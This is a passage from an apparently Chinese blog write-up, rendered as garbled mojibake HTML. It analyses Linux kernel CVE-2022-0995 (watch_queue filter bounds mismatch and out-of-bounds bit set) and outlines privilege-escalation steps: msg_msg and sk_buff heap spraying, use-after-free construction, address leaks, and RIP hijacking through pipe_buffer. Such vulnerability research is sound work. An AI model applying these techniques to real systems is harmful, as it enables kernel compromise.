nr_filter</code>ï¼ˆæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œé˜…è¯»æºç ï¼‰ï¼Œæ³¨æ„åˆ°è¿™é‡Œè®¡ç®—å¤§å°ç”¨çš„æ˜¯æˆ‘ä»¬å‰é¢éå†è®¡ç®—å¾—åˆ°çš„ <code>nr_filter</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!wfilter)<br><span class="hljs-keyword">goto</span> err_filter;<br>wfilter-&gt;nr_filters = nr_filter;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯å°† filter æ•°ç»„æ‹·è´åˆ°åˆ†é…çš„ç©ºé—´ä¸Šï¼Œ<strong>æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ¼æ´ä¾¿å‡ºç°åœ¨è¿™é‡Œï¼Œå…¶åˆ¤æ–­ type æ˜¯å¦åˆæ³•ä½¿ç”¨çš„æ˜¯</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ï¼Œ<strong>ä¸å‰é¢ nr_filter çš„è®¡ç®—å­˜åœ¨ä¸ä¸€è‡´æ€§</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">q = wfilter-&gt;filters;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)<br><span class="hljs-keyword">continue</span>;<br><br>q-&gt;type= tf[i].type;<br>q-&gt;info_filter= tf[i].info_filter;<br>q-&gt;info_mask= tf[i].info_mask;<br>q-&gt;subtype_filter[<span class="hljs-number">0</span>]= tf[i].subtype_filter[<span class="hljs-number">0</span>];<br>__set_bit(q-&gt;type, wfilter-&gt;type_filter);<br>q++;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>BITS_PER_LONG</code> å®šä¹‰äº <code>/include/asm-generic/bitsperlong.h</code> ä¸­ï¼Œ<strong>åœ¨ 32 ä½ä¸‹ä¸º 32ï¼Œ64 ä½ä¸‹ä¸º64</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_64BIT */</span></span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå‰åå¯¹ type èŒƒå›´çš„è®¡ç®—ä¾¿å­˜åœ¨ä¸ä¸€è‡´ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‡ ä¸ª filter çš„ type ä¸ºï¼ˆè®¡ç®— nr_filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼Œæ‹·è´ filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼‰è¿™ä¸ªèŒƒå›´å†…çš„ç‰¹å®šå€¼ï¼Œè¿™æ ·å°±èƒ½è¶Šç•Œæ‹·è´ä¸€å®šæ•°é‡çš„ filterï¼Œä»è€Œå®Œæˆå †ä¸Šçš„è¶Šç•Œå†™</strong></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å®¹æ˜“è®¡ç®—å¾—å‡ºè§¦å‘ç¬¬ä¸€ä¸ªæ¼æ´çš„ type çš„èŒƒå›´åº”ä¸º <code>[0x80, 0x400)</code></p><p>è€Œ<strong>ç¬¬äºŒä¸ªæ¼æ´åˆ™å­˜åœ¨äºä¸Šé¢è¿™æ®µä»£ç ä¸­å¯¹</strong> <code>__set_bit()</code> <strong>çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __set_bit(<span class="hljs-type">int</span> nr, <span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *addr)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mask = BIT_MASK(nr);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)addr) + BIT_WORD(nr);<br><br>*p  |= mask;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä½œç”¨ä¾¿æ˜¯<strong>å°† addr åç§» BIT_WORD(nr) å¤„çš„ BIT_MASK(mask) ä½è¿›è¡Œç½® 1 æ“ä½œ</strong>ï¼Œè¿™é‡Œçš„ <code>BIT_WORD()</code> å®ä¸»è¦æ˜¯é™¤ä»¥ long ç±»å‹æ‰€å ä½æ•°ï¼ˆ64ï¼‰ï¼Œè€Œ <code>BIT_MASK()</code> å®åˆ™æ˜¯å¯¹ long ç±»å‹æ‰€å ä½æ•°æ±‚æ¨¡åç»“æœä½œä¸º unsigned long å€¼ 1 å·¦ç§»çš„ä½æ•°å¯¼å‡ºç»“æœæ•°å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span><br></code></pre></td></tr></table></figure><p>è€Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆšå¥½ä¸º typeï¼Œç”±äºæˆ‘ä»¬çš„ type å¯ä»¥åœ¨ <code>[0x80, 0x400)</code> èŒƒå›´å†…å–ï¼Œ<strong>è€Œåˆ†é…çš„ filter ç©ºé—´å´æœªå¿…æœ‰é‚£ä¹ˆå¤§ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¶Šç•Œç½® 1 ä½çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªè¾ƒå¤§çš„ type å®Œæˆå †ä¸Šè¶Šç•Œç½® 1 ä½çš„æ“ä½œ</strong></p><p>ä¾‹å¦‚å¯¹äº <code>kmalloc-96</code> è€Œè¨€ï¼Œæˆ‘ä»¬çš„å¯¹è±¡å¯ä»¥è¦†ç›–åˆ°ä¸‹å›¾æ‰€ç¤ºèŒƒå›´ï¼ˆæœ¬å›¾æ¥è‡ªäº <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_oå¸ˆå‚…çš„åšå®¢</a>ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>åœ¨<a href="https://github.com/Bonfee/CVE-2022-0995">ç›®å‰å…¬å¼€çš„ exp</a> ä¸­å¯¹è¯¥æ¼æ´çš„åˆ©ç”¨å…¶å®æ˜¯åŸºäº <code>__set_bit()</code> è¿›è¡Œåˆ©ç”¨çš„ï¼Œå› ä¸ºç›¸è¾ƒäºä¸å¥½æ§åˆ¶çš„ filter æº¢å‡ºï¼Œè¶Šç•Œå†™ 1 ä½åˆ™æ›´æ–¹ä¾¿æˆ‘ä»¬æ§åˆ¶ä¸€äº›æŒ‡é’ˆï¼Œä¾‹å¦‚ <code>msg_msg-&gt;m_list</code> åŒå‘é“¾è¡¨</p><p>åœ¨è¿™ä»½å…¬å¼€çš„ exp ä¸­ä½¿ç”¨çš„å…¶å®æ˜¯ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§ï¼Œåªä¸è¿‡ç¯¡æ”¹ <code>msg_msg</code> å¤´éƒ¨çš„æ–¹å¼ä¸æ˜¯é‚»æ¥æº¢å‡ºå†™ 0ï¼Œè€Œæ˜¯è¶Šç•Œå†™ 1ï¼›æ¥ä¸‹æ¥ç¬”è€…å°†<del>å¤§å¹…æ‹·è´</del>ä½¿ç”¨ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§å®Œæˆå¯¹è¯¥æ¼æ´çš„åˆ©ç”¨</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"><a href="#Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯" class="headerlink" title="Step.I å †å–· msg_msg ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"></a>Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™ 1 ä½ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æ€æƒ³ä¾¿æ˜¯è¦†å†™ä¸€ä¸ªç»“æ„ä½“ä¸­çš„æŒ‡é’ˆï¼Œåˆ©ç”¨ partial overwrite ä½¿å¾—ä¸¤ä¸ªè¿™æ ·çš„ç»“æ„ä½“çš„å¤´éƒ¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“æ„ä½“ï¼Œ<strong>ä»è€Œå®ç° object overlapping</strong></p><p>é‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶é•¿åº¦å¯æ§ï¼Œä¸”å¼€å¤´æ­£å¥½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ‰€èƒ½è¦†å†™çš„ä¸ºå…¶ next æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆåˆ›å»ºå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 96ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>ä¹‹åæˆ‘ä»¬è¯»å‡ºå…¶ä¸­å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»æ¶ˆæ¯ä»¥äº§ç”Ÿç©ºæ´ï¼Œå†åˆ©ç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> è·å–åˆ°æˆ‘ä»¬åˆšé‡Šæ”¾çš„ <code>msg_msg</code> ç»“æ„ä½“çš„ç©ºé—´</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬è‡³å°‘è¦é‡Šæ”¾ä¸¤ä¸ªä¸»æ¶ˆæ¯ï¼Œå› ä¸ºåœ¨åˆ†é…åˆ° watch_filter ä¹‹å‰ memdup_user() è¿˜éœ€è¦è·å–ä¸€ä¸ªå¯¹è±¡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>å¯¹äº <code>__set_bit()</code> è€Œè¨€å…¶å¯ä»¥ç½® 1 çš„èŒƒå›´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆšå¥½å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ç›¸é‚» object çš„å‰ 16 å­—èŠ‚</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>åˆ©ç”¨è¶Šç•Œç½® 1 ä½æˆ‘ä»¬å¯ä»¥è¦†å†™åˆ°å…¶ç›¸é‚»çš„ä¸»æ¶ˆæ¯çš„ next æŒ‡é’ˆï¼Œè‹¥è¯¥ä½åˆšå¥½è¢«ç”± 0 å˜ä¸º 1ï¼Œåˆ™æˆ‘ä»¬å¾ˆå®¹æ˜“æ„é€ å‡º<strong>åœ¨ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå­˜åœ¨ä¸¤ä¸ªä¸»æ¶ˆæ¯æŒ‡å‘åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯</strong>çš„è¿™æ ·çš„å±€é¢</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸»ä»æ¶ˆæ¯ä¸­æ”¾ç½®å¯¹åº”çš„å€¼æ¥æ ‡è¯†å–·å°„çš„ä¸åŒçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œéå†è¯»å–æ‰€æœ‰é˜Ÿåˆ—æ¥æ„ŸçŸ¥æŒ‡å‘äº†åŒä¸€è¾…åŠ©æ¶ˆæ¯çš„ä¸¤ä¸ªé˜Ÿåˆ—</p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF"><a href="#Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF" class="headerlink" title="Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF"></a>Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF</h3><p>æ­¤æ—¶æˆ‘ä»¬å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€"><a href="#Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€" class="headerlink" title="Step.III å †å–· sk_buff ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€"></a>Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ª UAFï¼Œå› ä¸ºå…¶ä»ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œåç»­çš„åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨å¦å¤–ä¸€ä¸ªå¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“â€”â€”<code>sk_buff</code>ï¼Œç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ</strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"><a href="#Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="Step.IV å †å–· pipe_bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"></a>Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, 